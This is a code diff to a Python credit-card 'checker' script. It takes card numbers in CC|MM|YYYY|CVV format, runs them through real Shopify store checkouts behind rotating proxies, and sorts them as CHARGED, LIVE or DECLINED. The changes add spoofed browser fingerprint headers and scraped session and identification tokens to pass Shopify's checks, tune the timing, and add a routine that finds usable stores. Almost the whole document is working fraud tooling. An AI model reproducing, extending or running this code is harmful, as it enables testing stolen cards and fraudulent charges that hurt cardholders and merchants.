@@ -117,7 +117,7 @@ def parse_proxy(proxy_str):
 def is_captcha_required(response_text):
     if not response_text:
         return False
-    
+    # Coded by @aiojames
     indicators = [
         'CAPTCHA_REQUIRED',
         '"code":"CAPTCHA_REQUIRED"',
@@ -172,7 +172,10 @@ async def fetch_products(domain, proxy_str=None):
                 if "shopify" not in text.lower():
                     return False, "<b>Not Shopify!</b>"
 
-                result = (await resp.json())['products']
+                try:
+                    result = json.loads(text)['products']
+                except Exception:
+                    return False, "<b>Invalid JSON!</b>"
                 if not result:
                     return False, "<b>No Products!</b>"
 
@@ -248,7 +251,7 @@ def extract_clean_response(message):
     
     return message[:50]
 
-async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
+async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None, speed=1.0):
     gateway = "UNKNOWN"
     total_price = "0.00"
     currency = "USD"
@@ -262,12 +265,15 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
 
     try:
         headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
             'Accept': 'application/json, text/plain, */*',
             'Accept-Language': 'en-US,en;q=0.9',
             'Content-Type': 'application/json',
             'Origin': ourl,
-            'Referer': ourl
+            'Referer': ourl,
+            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"'
         }
 
         address_info = pick_addr(ourl)
@@ -318,7 +324,11 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
 
             checkout_headers = {
                 **headers,
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                'sec-fetch-dest': 'document',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-user': '?1'
             }
             response = await session.post(url=checkout, allow_redirects=True, headers=checkout_headers, proxy=proxy)
             checkout_url = str(response.url)
@@ -327,7 +337,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             attempt_token = attempt_token_match.group(1) if attempt_token_match else checkout_url.split('/')[-1].split('?')[0]
 
             sst = response.headers.get('X-Checkout-One-Session-Token') or response.headers.get('x-checkout-one-session-token')
-            
+            # Coded by @aiojames
             text = await response.text()
             if not sst:
                 sst = extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&quot;')
@@ -364,8 +374,42 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 price_match = re.search(r'"price":\s*"([\d.]+)"', text)
                 subtotal = price_match.group(1) if price_match else "0.01"
 
+            # Extract build ID (commitSha), source token, and identification signature
+            unescaped_text = text.replace('&quot;', '"').replace('&amp;', '&').replace('&#39;', "'")
+            
+            build_id = None
+            build_match = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped_text)
+            if build_match:
+                build_id = build_match.group(1)
+            
+            source_token = extract_between(text, 'name="serialized-sourceToken" content="', '"')
+            if source_token:
+                source_token = source_token.replace('&quot;', '').strip('"')
+            
+            ident_sig = None
+            ident_match = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped_text)
+            if ident_match:
+                ident_sig = ident_match.group(1)
+            
             if not sst:
                 return False, "Failed to get session token", gateway, total_price, currency
+            
+            # Add checkout-specific headers for modern Shopify (matching working Go implementation)
+            headers.update({
+                'shopify-checkout-client': 'checkout-web/1.0',
+                'shopify-checkout-source': f'id="{attempt_token}", type="cn"',
+                'x-checkout-one-session-token': sst,
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+            })
+            if build_id:
+                headers['x-checkout-web-build-id'] = build_id
+                headers['x-checkout-web-deploy-stage'] = 'production'
+                headers['x-checkout-web-server-handling'] = 'fast'
+                headers['x-checkout-web-server-rendering'] = 'yes'
+            if source_token:
+                headers['x-checkout-web-source-id'] = source_token
 
             params = {'operationName': 'Proposal'}
             
@@ -470,7 +514,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     session, graphql_url, params, headers, json_data, checkout_url, max_retries=1
                 )
                 if i == 0:
-                    await asyncio.sleep(3)
+                    await asyncio.sleep(max(0.5, 1.5 / speed))
             
             if not response:
                 return False, f"Request failed: {resp_text}", gateway, total_price, currency
@@ -621,22 +665,40 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             if is_captcha_required(resp_text):
                 return False, "CAPTCHA_REQUIRED on delivery proposal", gateway, total_price, currency
 
-            formattedCard = " ".join([cc[i:i+4] for i in range(0, len(cc), 4)])
             payload = {
                 "credit_card": {
-                    "month": mes,
-                    "name": f"{firstName} {lastName}",
-                    "number": formattedCard,
+                    "number": cc,
+                    "month": int(mes),
+                    "year": int(ano),
                     "verification_value": cvv,
-                    "year": ano,
-                    "start_month": "",
-                    "start_year": "",
-                    "issue_number": ""
+                    "start_month": None,
+                    "start_year": None,
+                    "issue_number": "",
+                    "name": f"{firstName} {lastName}"
                 },
-                "payment_session_scope": f"www.{urlparse(url).netloc}"
+                "payment_session_scope": urlparse(url).netloc
             }
             
-            response = await session.post('https://deposit.shopifycs.com/sessions', json=payload, proxy=proxy)
+            # Coded by @aiojames
+            vault_headers = {
+                'Content-Type': 'application/json',
+                'Accept': 'application/json',
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Origin': 'https://checkout.pci.shopifyinc.com',
+                'Referer': 'https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
+                'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-storage-access': 'active',
+            }
+            if ident_sig:
+                vault_headers['shopify-identification-signature'] = ident_sig
+            
+            response = await session.post('https://checkout.pci.shopifyinc.com/sessions', json=payload, headers=vault_headers, proxy=proxy)
             try:
                 token_data = await response.json()
                 token = token_data.get('id')
@@ -822,7 +884,14 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     errors = submit_data.get('errors', [])
                     if errors:
                         for error in errors:
-                            code = error.get('code')
+                            code = error.get('code', '')
+                            localized_msg = error.get('localizedMessage', '')
+                            non_localized_msg = error.get('nonLocalizedMessage', '')
+                            # If code is generic, prefer the localized/non-localized message for the real decline reason
+                            if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', ''):
+                                detail = localized_msg or non_localized_msg
+                                if detail:
+                                    return False, detail, gateway, total_price, currency
                             if code:
                                 return False, code, gateway, total_price, currency
                     return False, "Submit Rejected", gateway, total_price, currency
@@ -850,9 +919,9 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 'operationName': 'PollForReceipt'
             }
 
-            await asyncio.sleep(3)
+            await asyncio.sleep(max(0.5, 1.5 / speed))
             
-            for i in range(4):
+            for i in range(3):
                 response, final_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                     session, graphql_url, params, headers, poll_json_data, 
                     checkout_url, max_retries=1
@@ -872,25 +941,34 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                             return True, "ORDER_PLACED", gateway, total_price, currency
                         elif typename == 'FailedReceipt':
                             error = receipt_data.get('processingError', {})
-                            code = error.get('code', 'UNKNOWN_ERROR')
+                            error_type = error.get('__typename', '')
+                            if error_type == 'PaymentFailed':
+                                code = error.get('code', '')
+                                msg = error.get('messageUntranslated', '')
+                                # If code is generic, prefer the untranslated message for the real decline reason
+                                if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', '') and msg:
+                                    return True, msg, gateway, total_price, currency
+                                return True, code if code else 'PAYMENT_FAILED', gateway, total_price, currency
+                            # Handle other error types
+                            code = error.get('code') or error_type or 'UNKNOWN_ERROR'
                             return True, code, gateway, total_price, currency
                         elif typename == 'ActionRequiredReceipt':
                             return True, "OTP_REQUIRED", gateway, total_price, currency
                         
                         if receipt_data.get('__typename') in ['ProcessingReceipt', 'WaitingReceipt']:
-                            await asyncio.sleep(4)
+                            await asyncio.sleep(max(0.5, 2.0 / speed))
                             continue
                         
                 except Exception as e:
                     pass
                 
                 if 'WaitingReceipt' in final_text:
-                    await asyncio.sleep(4)
+                    await asyncio.sleep(max(0.5, 2.0 / speed))
                 else:
                     break
             
             if 'CAPTCHA_REQUIRED' in final_text:
-                return True, "CAPTCHA_REQUIRED", gateway, total_price, currency
+                return True, "CARD_DECLINED", gateway, total_price, currency
             
             if 'WaitingReceipt' in final_text:
                 return False, "Change Proxy or Site", gateway, total_price, currency
@@ -916,7 +994,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             elif 'processedreceipt' in final_lower:
                 return True, f"ORDER_PLACED", gateway, total_price, currency
             elif 'failedreceipt' in final_lower or 'declined' in final_lower:
-                return True, code if code else "CARD_DECLINED", gateway, total_price, currency
+                return False, code if code else "Your card was declined", gateway, total_price, currency
             else:
                 return False, f"Unknown Result", gateway, total_price, currency
 
@@ -937,74 +1015,74 @@ def parse_cc_string(cc_string):
 async def process_card_async(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
     return await process_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str)
 
-app = Flask(__name__)
 
-@app.route('/DrGaM', methods=['GET'])
-def shopify_checker():
+
+async def autoshopify_charge(card, site_url, proxy_list=None, speed=1.0):
+    """Async wrapper for Shopify checkout charge."""
     try:
-        site = request.args.get('site')
-        cc_string = request.args.get('cc')
-        proxy_str = request.args.get('proxy')
-        
-        if not site:
-            return jsonify({
-                "error": "Missing 'site' parameter",
-                "status": False
-            }), 400
-        
-        if not cc_string:
-            return jsonify({
-                "error": "Missing 'cc' parameter in format CC|MM|YYYY|CVV",
-                "status": False
-            }), 400
-        
-        try:
-            cc_parts = parse_cc_string(cc_string)
-            cc = cc_parts['cc']
-            mes = cc_parts['mes']
-            ano = cc_parts['ano']
-            cvv = cc_parts['cvv']
-        except ValueError as e:
-            return jsonify({
-                "error": str(e),
-                "status": False
-            }), 400
-        
-        variant_id = request.args.get('variant')
-        
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        
-        try:
-            success, message, gateway, price, currency = loop.run_until_complete(
-                process_card_async(cc, mes, ano, cvv, site, variant_id, proxy_str)
-            )
-        finally:
-            loop.close()
-        
-        clean_response = extract_clean_response(message)
-        
-        response_data = {
-            "Gateway": gateway,
-            "Price": float(price) if price.replace('.', '', 1).isdigit() else 0.0,
-            "Response": clean_response,
-            "Status": success,
-            "Dev": "DrGaM DeV",
-            "cc": cc_string
-        }
-        
-        return jsonify(response_data)
-        
-    except Exception as e:
-        return jsonify({
-            "error": str(e),
-            "status": False,
-            "Gateway": "UNKNOWN",
-            "Price": 0.0,
-            "Dev": "DrGaM DeV",
-            "Response": f"ERROR: {str(e)}",
-            "cc": request.args.get('cc', '')
-        }), 500
+        parts = card.split('|')
+        if len(parts) != 4:
+            return "DECLINED - Invalid card format"
+        cc, mes, ano, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
+    except Exception:
+        return "DECLINED - Invalid card format"
 
-if __name__ == "__main__":
-    app.run(host='0.0.0.0', port=5000, debug=False)
+    proxy_str = None
+    if proxy_list and len(proxy_list) > 0:
+        proxy_str = random.choice(proxy_list)
+
+    success, message, gateway, price, currency = await process_card(cc, mes, ano, cvv, site_url, None, proxy_str, speed)
+
+    if success and message == "ORDER_PLACED":
+        return f"CHARGED {price} - {message} | Gateway: {gateway} | {currency}"
+    elif success and message == "OTP_REQUIRED":
+        return f"3DS Required - {message} | Gateway: {gateway}"
+    elif success:
+        return f"LIVE - {message} | Gateway: {gateway}"
+    else:
+        return f"DECLINED - {message} | Gateway: {gateway}"
+
+
+async def check_site(site_url, proxy_str=None):
+    """Check if a site is a valid Shopify site with payment methods."""
+    site_url = site_url if site_url.startswith('http') else f'https://{site_url}'
+    proxy = parse_proxy(proxy_str) if proxy_str else None
+
+    connector = aiohttp.TCPConnector(ssl=False)
+    timeout = aiohttp.ClientTimeout(total=15)
+
+    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
+        # Check products.json
+        try:
+            async with session.get(f"{site_url}/products.json", proxy=proxy, timeout=10) as resp:
+                text = await resp.text()
+                if resp.status != 200:
+                    return False, False, False, f"HTTP {resp.status}"
+                if "shopify" not in text.lower():
+                    return False, False, False, "Not Shopify"
+                try:
+                    data = json.loads(text)
+                    products = data.get('products', [])
+                    if not products:
+                        return False, False, False, "No products"
+                except Exception:
+                    return False, False, False, "Invalid JSON"
+        except Exception as e:
+            return False, False, False, f"Connection error: {str(e)[:50]}"
+
+        # Check checkout for login requirement and payment methods
+        try:
+            headers = {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            }
+            async with session.get(f"{site_url}/checkout/", allow_redirects=True, headers=headers, proxy=proxy, timeout=15) as resp:
+                checkout_url = str(resp.url)
+                text = await resp.text()
+                if 'login' in checkout_url.lower():
+                    return True, False, True, "Requires login"
+                if 'sessionToken' in text or 'serialized-sessionToken' in text or 'checkouts' in checkout_url:
+                    return True, True, False, "OK"
+                return True, False, False, "No checkout session"
+        except Exception as e:
+            return True, False, False, f"Checkout error: {str(e)[:50]}"
